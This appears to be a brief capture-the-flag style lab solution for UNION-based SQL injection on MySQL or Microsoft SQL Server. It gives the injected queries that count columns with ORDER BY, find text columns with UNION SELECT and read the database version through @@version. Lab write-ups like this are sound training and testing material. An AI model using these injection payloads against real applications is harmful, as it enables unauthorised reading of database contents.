## Lab Description :

![image]()

![image]()


## Solution :

> NOTE - Since it is either microsoft or MYQL db use **#** as comment 

#### Determine no of columns -

**ORDER BY 3** gives error which means there are 2 columns.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 #
```

![image]()

#### Determine column which has text data -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'shebu','cys' #
```

Both the columns have text data since both returns the same i/p value.

![image]()

#### Retreive db version 

The syntax to find version info of both MYSQL & Microsoft db are the same - `@@version`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT @@version,NULL #
```
![image]()

![image](https://user-images.githubusercontent.com/67383098/234122101-b1a2b88b-2e38-4d3b-8137-406bef3484b1.png)

